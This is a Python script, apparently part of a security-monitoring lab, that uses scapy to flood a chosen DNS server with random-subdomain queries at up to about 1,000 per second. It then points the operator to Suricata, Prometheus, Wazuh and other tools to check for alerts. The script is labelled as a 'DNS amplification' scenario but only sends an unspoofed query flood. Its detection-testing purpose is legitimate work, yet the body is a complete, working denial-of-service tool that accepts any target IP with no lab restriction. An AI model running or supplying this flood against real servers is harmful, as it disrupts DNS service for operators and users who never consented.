#!/usr/bin/env python3
"""
Scenario 3: DNS Query Flood (DNS Amplification DDoS)
- Difficulty: Intermediate
- Detection: Suricata, Prometheus, Wazuh
- Expected Alert: DNS flood pattern, query rate spike
"""

import sys
import argparse
import logging
import time
import random
import string
from scapy.all import IP, UDP, DNS, DNSQR, send, conf

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

conf.verbose = False

class DNSFloodScenario:
    def __init__(self, target, duration=45, intensity=5, verbose=False):
        self.target = target
        self.duration = duration
        self.intensity = intensity  # 1-10 scale
        self.verbose = verbose
        self.query_count = 0
        self.start_time = None
        self.results = {
            'scenario': 'DNS_FLOOD',
            'target': target,
            'duration': duration,
            'queries_sent': 0,
            'qps': 0,  # queries per second
            'status': 'pending'
        }

    def generate_random_domain(self):
        """Generate random domain name for each query"""
        random_part = ''.join(random.choices(string.ascii_lowercase, k=10))
        return f"{random_part}.example.com"

    def generate_dns_queries(self):
        """Generate DNS flood packets"""
        queries_per_second = 500 * self.intensity / 5  # 500 QPS at intensity 5

        logger.info(f"[*] Starting DNS Flood against {self.target}")
        logger.info(f"[*] Duration: {self.duration}s | Intensity: {self.intensity}/10 ({queries_per_second:.0f} QPS)")

        self.start_time = time.time()
        elapsed = 0
        delay = 1.0 / queries_per_second if queries_per_second > 0 else 0

        try:
            while elapsed < self.duration:
                domain = self.generate_random_domain()

                # Create DNS query packet
                pkt = IP(dst=self.target) / UDP(dport=53) / DNS(
                    rd=1,  # Recursion desired
                    qd=DNSQR(qname=domain, qtype='A')
                )

                try:
                    send(pkt, verbose=0)
                    self.query_count += 1

                    if self.verbose and self.query_count % 100 == 0:
                        logger.info(f"[+] Sent {self.query_count} queries...")

                    time.sleep(delay)
                except Exception as e:
                    if self.verbose:
                        logger.warning(f"[-] Error sending query: {e}")

                elapsed = time.time() - self.start_time

        except KeyboardInterrupt:
            logger.info("\n[!] Attack interrupted by user")
        except Exception as e:
            logger.error(f"[-] Attack failed: {e}")
            self.results['status'] = 'failed'
            return

        self.results['queries_sent'] = self.query_count
        self.results['qps'] = self.query_count / self.duration if self.duration > 0 else 0
        self.results['status'] = 'completed'
        self.log_results()

    def log_results(self):
        """Log scenario results"""
        logger.info("\n" + "="*60)
        logger.info("DNS FLOOD RESULTS")
        logger.info("="*60)
        logger.info(f"Target: {self.target}")
        logger.info(f"Duration: {self.duration} seconds")
        logger.info(f"Total Queries Sent: {self.query_count}")
        logger.info(f"Queries Per Second (QPS): {self.results['qps']:.2f}")
        logger.info(f"Status: {self.results['status'].upper()}")
        logger.info("="*60)
        logger.info("\n[!] Check Monitoring Systems:")
        logger.info("  - Suricata: Look for DNS flood alerts")
        logger.info("  - Prometheus: Monitor dns_query_rate spike")
        logger.info("  - Grafana: Check DNS Monitoring dashboard")
        logger.info("  - Wazuh: Search for 'DNS' anomaly alerts")
        logger.info("  - Netdata: Check DNS query rate")
        logger.info("="*60 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description='DNS Query Flood (DNS Amplification) Scenario',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python 03_dns_flood.py --target 10.10.10.10 --duration 45
  python 03_dns_flood.py --target 192.168.1.1 --intensity 8 --verbose
        '''
    )

    parser.add_argument('--target', required=True, help='Target DNS server IP')
    parser.add_argument('--duration', type=int, default=45, help='Attack duration in seconds (default: 45)')
    parser.add_argument('--intensity', type=int, default=5, help='Attack intensity 1-10 (default: 5)')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')

    args = parser.parse_args()

    # Validate inputs
    if not 1 <= args.intensity <= 10:
        logger.error("[-] Intensity must be between 1-10")
        sys.exit(1)

    if args.duration < 1:
        logger.error("[-] Duration must be at least 1 second")
        sys.exit(1)

    # Run scenario
    scenario = DNSFloodScenario(
        target=args.target,
        duration=args.duration,
        intensity=args.intensity,
        verbose=args.verbose
    )

    scenario.generate_dns_queries()

if __name__ == '__main__':
    main()
